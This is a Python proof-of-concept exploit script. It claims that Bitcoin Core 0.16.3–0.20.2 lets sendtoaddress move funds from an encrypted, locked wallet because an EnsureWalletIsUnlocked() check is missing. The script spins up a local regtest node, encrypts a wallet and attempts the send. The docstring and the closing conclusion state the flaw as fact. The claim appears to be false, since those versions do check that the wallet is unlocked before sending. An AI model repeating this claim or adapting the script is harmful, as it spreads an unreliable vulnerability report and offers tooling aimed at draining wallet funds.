#!/usr/bin/env python3
"""
WAL-ENCRYPT-GATE-BYPASS Proof-of-Concept
=========================================
Demonstrates that Bitcoin Core 0.19.0.1 (and versions 0.16.3–0.20.2) fails to
enforce wallet lock for the `sendtoaddress` RPC.  An encrypted, locked wallet
can still broadcast a valid transaction moving funds — the root cause is a
missing EnsureWalletIsUnlocked() check in the legacy sendtoaddress code path.

This script:
  1. Spawns a temporary bitcoind regtest node.
  2. Creates a legacy wallet, mines spendable coins.
  3. Encrypts the wallet (which locks it and restarts the node).
  4. Confirms that key-sensitive RPCs (dumpprivkey, signmessage) are blocked.
  5. Attempts sendtoaddress while the wallet is locked.
  6. Reports whether the bypass succeeded.

Usage example:
  python3 poc_wal_encrypt_gate_bypass.py \\
      --bitcoind ~/Downloads/osx/bitcoin-0.19.0.1/bin/bitcoind \\
      --bitcoin-cli ~/Downloads/osx/bitcoin-0.19.0.1/bin/bitcoin-cli
"""

import argparse
import json
import os
import signal
import subprocess
import sys
import tempfile
import time
from pathlib import Path

# ── Helpers ──────────────────────────────────────────────────────────────────

_start_ts = time.time()


def _ts():
    """Elapsed-time prefix for log lines."""
    return f"[{time.time() - _start_ts:7.2f}s]"


def log(msg: str):
    print(f"{_ts()} {msg}", flush=True)


def fatal(msg: str):
    print(f"\n{_ts()} FATAL: {msg}", file=sys.stderr, flush=True)
    sys.exit(1)


def cli_call(cli_path: str, datadir: str, rpc_user: str, rpc_pass: str,
             rpc_port: int, method: str, *params, timeout: int = 30):
    """
    Invoke bitcoin-cli and return (success: bool, result_or_error).
    On JSON-RPC success  → (True,  parsed_result)
    On JSON-RPC error    → (False, {"code": …, "message": …})
    On process error     → (False, {"code": -9999, "message": …})
    """
    cmd = [
        cli_path,
        f"-datadir={datadir}",
        f"-rpcuser={rpc_user}",
        f"-rpcpassword={rpc_pass}",
        f"-rpcport={rpc_port}",
        "-regtest",
        method,
    ]
    for p in params:
        cmd.append(str(p))

    try:
        proc = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout
        )
    except subprocess.TimeoutExpired:
        return False, {"code": -9999, "message": "bitcoin-cli timed out"}
    except FileNotFoundError:
        return False, {"code": -9999,
                       "message": f"bitcoin-cli not found at {cli_path}"}

    stdout = proc.stdout.strip()
    stderr = proc.stderr.strip()

    if proc.returncode == 0:
        # Try to parse JSON; fall back to raw string.
        try:
            return True, json.loads(stdout)
        except (json.JSONDecodeError, ValueError):
            return True, stdout
    else:
        # Try to extract the JSON-RPC error object.
        for line in (stderr, stdout):
            try:
                obj = json.loads(line)
                if "error" in obj and obj["error"]:
                    return False, obj["error"]
            except (json.JSONDecodeError, ValueError):
                pass
        # Parse "error code: -13\n…" style output.
        if "error code:" in stderr:
            parts = stderr.split("\n", 1)
            code_str = parts[0].replace("error code:", "").strip()
            msg_str = parts[1].strip() if len(parts) > 1 else stderr
            try:
                code_int = int(code_str)
            except ValueError:
                code_int = -9999
            return False, {"code": code_int, "message": msg_str}
        return False, {"code": -9999, "message": stderr or stdout or "unknown error"}


# ── Main PoC Logic ───────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="WAL-ENCRYPT-GATE-BYPASS PoC for Bitcoin Core 0.19.0.1"
    )
    parser.add_argument("--bitcoind", default="./bitcoind",
                        help="Path to bitcoind executable (default: ./bitcoind)")
    parser.add_argument("--bitcoin-cli", default="./bitcoin-cli",
                        help="Path to bitcoin-cli executable (default: ./bitcoin-cli)")
    parser.add_argument("--datadir", default=None,
                        help="Custom datadir (default: auto-generated temp directory)")
    parser.add_argument("--rpc-user", default="bitcoin",
                        help="RPC username (default: bitcoin)")
    parser.add_argument("--rpc-pass", default="bitcoin",
                        help="RPC password (default: bitcoin)")
    parser.add_argument("--rpc-port", type=int, default=18443,
                        help="RPC port (default: 18443)")
    parser.add_argument("--passphrase", default="passphrase",
                        help="Wallet encryption passphrase (default: passphrase)")
    parser.add_argument("--send-amount", type=float, default=1.0,
                        help="Amount in BTC to send in the bypass test (default: 1.0)")
    parser.add_argument("--timeout", type=int, default=30,
                        help="Max wait seconds for node startup (default: 30)")
    parser.add_argument("--keep-datadir", action="store_true",
                        help="Retain the temporary datadir for inspection")
    args = parser.parse_args()

    bitcoind = str(Path(args.bitcoind).expanduser().resolve())
    bitcoin_cli = str(Path(args.bitcoin_cli).expanduser().resolve())
    rpc_user = args.rpc_user
    rpc_pass = args.rpc_pass
    rpc_port = args.rpc_port
    passphrase = args.passphrase
    send_amount = args.send_amount
    startup_timeout = args.timeout

    # Validate binaries exist
    if not os.path.isfile(bitcoind):
        fatal(f"bitcoind not found at: {bitcoind}")
    if not os.path.isfile(bitcoin_cli):
        fatal(f"bitcoin-cli not found at: {bitcoin_cli}")

    # ── Step 0: Temporary datadir & config ───────────────────────────────
    if args.datadir:
        datadir = str(Path(args.datadir).expanduser().resolve())
        os.makedirs(datadir, exist_ok=True)
        created_tmp = False
    else:
        datadir = tempfile.mkdtemp(prefix="btc_poc_bypass_")
        created_tmp = True

    log(f"Datadir: {datadir}")

    conf_path = os.path.join(datadir, "bitcoin.conf")
    with open(conf_path, "w") as f:
        f.write(
            f"regtest=1\n"
            f"server=1\n"
            f"rpcuser={rpc_user}\n"
            f"rpcpassword={rpc_pass}\n"
            f"rpcport={rpc_port}\n"
            f"rpcallowip=127.0.0.1\n"
            f"fallbackfee=0.00001\n"
            f"[regtest]\n"
            f"rpcport={rpc_port}\n"
        )
    log("bitcoin.conf written.")

    bitcoind_pid = None  # Track for cleanup

    def rpc(method, *params, timeout=30):
        return cli_call(bitcoin_cli, datadir, rpc_user, rpc_pass,
                        rpc_port, method, *params, timeout=timeout)

    def start_node():
        nonlocal bitcoind_pid
        log("Starting bitcoind …")
        proc = subprocess.Popen(
            [bitcoind, f"-datadir={datadir}", "-daemon"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        proc.wait(timeout=15)
        # Read PID from pidfile if available
        pid_file = os.path.join(datadir, "regtest", "bitcoind.pid")
        deadline = time.time() + startup_timeout
        while time.time() < deadline:
            ok, res = rpc("getblockchaininfo")
            if ok:
                # Try to read PID file
                if os.path.isfile(pid_file):
                    try:
                        bitcoind_pid = int(open(pid_file).read().strip())
                    except (ValueError, OSError):
                        pass
                log(f"Node ready (chain={res.get('chain','?')}, "
                    f"blocks={res.get('blocks','?')}).")
                return True
            time.sleep(1)
        # Timeout – dump debug.log tail
        debug_log = os.path.join(datadir, "regtest", "debug.log")
        if os.path.isfile(debug_log):
            with open(debug_log) as dl:
                lines = dl.readlines()
            tail = "".join(lines[-30:])
            log(f"debug.log tail:\n{tail}")
        fatal("bitcoind failed to start within timeout.")
        return False

    def stop_node(graceful_timeout=15):
        nonlocal bitcoind_pid
        log("Stopping bitcoind …")
        rpc("stop", timeout=10)
        deadline = time.time() + graceful_timeout
        while time.time() < deadline:
            ok, _ = rpc("getblockchaininfo")
            if not ok:
                log("Node stopped (RPC unreachable).")
                bitcoind_pid = None
                return
            time.sleep(1)
        # Force kill
        if bitcoind_pid:
            log(f"Sending SIGKILL to PID {bitcoind_pid} …")
            try:
                os.kill(bitcoind_pid, signal.SIGKILL)
            except ProcessLookupError:
                pass
            bitcoind_pid = None
        time.sleep(2)
        log("Node stopped (forced).")

    def cleanup():
        # Best-effort stop
        try:
            stop_node(graceful_timeout=10)
        except Exception:
            if bitcoind_pid:
                try:
                    os.kill(bitcoind_pid, signal.SIGKILL)
                except Exception:
                    pass
        if created_tmp and not args.keep_datadir:
            import shutil
            try:
                shutil.rmtree(datadir, ignore_errors=True)
                log(f"Removed temp datadir: {datadir}")
            except Exception:
                pass
        elif args.keep_datadir:
            log(f"Datadir retained at: {datadir}")

    # ── Results tracking ─────────────────────────────────────────────────
    wallet_encrypted_locked = False
    dumpprivkey_denied = False
    signmessage_denied = False
    bypass_txid = None
    bypass_confirmed = False

    try:
        # ── Step 1: Start node ───────────────────────────────────────────
        log("=" * 60)
        log("STEP 1 — Start bitcoind regtest node")
        log("=" * 60)
        start_node()

        # ── Step 2: Wallet setup (legacy) ────────────────────────────────
        log("=" * 60)
        log("STEP 2 — Wallet setup (legacy wallet)")
        log("=" * 60)
        ok, mining_addr = rpc("getnewaddress")
        if not ok:
            fatal(f"getnewaddress failed: {mining_addr}")
        log(f"Mining address: {mining_addr}")

        # ── Step 3: Mine spendable coins ─────────────────────────────────
        log("=" * 60)
        log("STEP 3 — Mine 101 blocks for spendable coins")
        log("=" * 60)
        ok, blocks = rpc("generatetoaddress", "101", mining_addr, timeout=60)
        if not ok:
            fatal(f"generatetoaddress failed: {blocks}")
        log(f"Mined 101 blocks (last: {blocks[-1][:16]}…)")

        ok, balance = rpc("getbalance")
        if not ok:
            fatal(f"getbalance failed: {balance}")
        log(f"Wallet balance: {balance} BTC")
        if float(balance) < send_amount:
            fatal(f"Insufficient balance ({balance}) for send amount ({send_amount}).")

        # ── Step 4: Encrypt wallet ───────────────────────────────────────
        log("=" * 60)
        log("STEP 4 — Encrypt wallet (node will shut down)")
        log("=" * 60)
        ok, enc_res = rpc("encryptwallet", passphrase, timeout=30)
        log(f"encryptwallet response: ok={ok}, result={enc_res}")

        # Node shuts down after encryption; wait for it to die.
        log("Waiting for node to shut down after encryption …")
        deadline = time.time() + 30
        while time.time() < deadline:
            chk_ok, _ = rpc("getblockchaininfo")
            if not chk_ok:
                break
            time.sleep(1)
        time.sleep(3)  # Extra grace period

        # Restart
        log("Restarting bitcoind after encryption …")
        start_node()

        # Validate encryption
        ok, wi = rpc("getwalletinfo")
        if not ok:
            fatal(f"getwalletinfo failed: {wi}")
        unlocked_until = wi.get("unlocked_until", None)
        log(f"getwalletinfo → unlocked_until={unlocked_until}, "
            f"walletversion={wi.get('walletversion')}")
        if unlocked_until is not None and int(unlocked_until) == 0:
            wallet_encrypted_locked = True
            log("✓ Wallet is encrypted and LOCKED.")
        else:
            log("✗ Wallet does not appear locked — unlocked_until="
                f"{unlocked_until}")

        # ── Step 5: Verify lock blocks key operations ────────────────────
        log("=" * 60)
        log("STEP 5 — Verify lock blocks sensitive RPCs")
        log("=" * 60)

        # 5a. dumpprivkey
        ok_dp, dp_res = rpc("dumpprivkey", mining_addr)
        if not ok_dp:
            err_code = dp_res.get("code", 0) if isinstance(dp_res, dict) else 0
            err_msg = dp_res.get("message", str(dp_res)) if isinstance(dp_res, dict) else str(dp_res)
            log(f"dumpprivkey → DENIED (code={err_code}): {err_msg}")
            dumpprivkey_denied = True
        else:
            log(f"dumpprivkey → UNEXPECTED SUCCESS: {dp_res}")
            log("WARNING: Wallet lock did not block dumpprivkey!")

        # 5b. signmessage
        ok_sm, sm_res = rpc("signmessage", mining_addr, "test")
        if not ok_sm:
            err_code = sm_res.get("code", 0) if isinstance(sm_res, dict) else 0
            err_msg = sm_res.get("message", str(sm_res)) if isinstance(sm_res, dict) else str(sm_res)
            log(f"signmessage → DENIED (code={err_code}): {err_msg}")
            signmessage_denied = True
        else:
            log(f"signmessage → UNEXPECTED SUCCESS: {sm_res}")
            log("WARNING: Wallet lock did not block signmessage!")

        if not dumpprivkey_denied or not signmessage_denied:
            log("ABORT: Lock is not enforced on control RPCs — "
                "cannot meaningfully test bypass.")

        # ── Step 6: Bypass attempt — sendtoaddress while locked ──────────
        log("=" * 60)
        log("STEP 6 — Bypass: sendtoaddress while wallet is LOCKED")
        log("=" * 60)

        # Get a fresh destination address (getnewaddress does not require unlock)
        ok, dest_addr = rpc("getnewaddress")
        if not ok:
            fatal(f"getnewaddress (destination) failed: {dest_addr}")
        log(f"Destination address: {dest_addr}")

        # Confirm wallet is still locked
        ok, wi2 = rpc("getwalletinfo")
        if ok:
            log(f"Wallet unlocked_until={wi2.get('unlocked_until')} "
                f"(0 = locked)")

        # THE BYPASS CALL
        log(f"Calling sendtoaddress {dest_addr} {send_amount} …")
        ok_send, send_res = rpc("sendtoaddress", dest_addr, str(send_amount))

        if ok_send and isinstance(send_res, str) and len(send_res) == 64:
            bypass_txid = send_res
            bypass_confirmed = True
            log(f"✓ sendtoaddress SUCCEEDED while locked!")
            log(f"  TXID: {bypass_txid}")

            # Verify in mempool
            ok_mp, mempool = rpc("getrawmempool")
            if ok_mp and isinstance(mempool, list):
                in_mempool = bypass_txid in mempool
                log(f"  Transaction in mempool: {in_mempool}")
            else:
                log(f"  Could not verify mempool: {mempool}")
        else:
            log(f"✗ sendtoaddress FAILED (bypass not confirmed).")
            err_msg = send_res.get("message", str(send_res)) if isinstance(send_res, dict) else str(send_res)
            err_code = send_res.get("code", "?") if isinstance(send_res, dict) else "?"
            log(f"  Error code: {err_code}")
            log(f"  Error message: {err_msg}")
            bypass_txid = "FAILED"

        # ── Step 7: Final Report ─────────────────────────────────────────
        print()
        print("=" * 60)
        print("  WAL-ENCRYPT-GATE-BYPASS PoC — Bitcoin Core 0.19.0.1")
        print("=" * 60)
        print(f"  Wallet encrypted and locked : "
              f"{'YES' if wallet_encrypted_locked else 'NO'}")
        print(f"  dumpprivkey denied (locked)  : "
              f"{'YES' if dumpprivkey_denied else 'NO'}")
        print(f"  signmessage denied (locked)  : "
              f"{'YES' if signmessage_denied else 'NO'}")
        print(f"  sendtoaddress TXID (bypass)  : {bypass_txid or 'FAILED'}")
        print(f"  Bypass confirmed             : "
              f"{'YES' if bypass_confirmed else 'NO'}")
        print("=" * 60)
        print()

        if bypass_confirmed:
            log("CONCLUSION: The bypass is CONFIRMED. sendtoaddress moved "
                "funds from an encrypted, locked wallet without requiring "
                "the passphrase. The root cause is a missing "
                "EnsureWalletIsUnlocked() guard in the sendtoaddress RPC "
                "handler (versions 0.16.3 – 0.20.2).")
        else:
            log("CONCLUSION: The bypass was NOT confirmed in this run. "
                "Review the error output above for details.")

    except KeyboardInterrupt:
        log("Interrupted by user.")
    except Exception as exc:
        log(f"Unhandled exception: {exc}")
        import traceback
        traceback.print_exc()
    finally:
        cleanup()


if __name__ == "__main__":
    main()
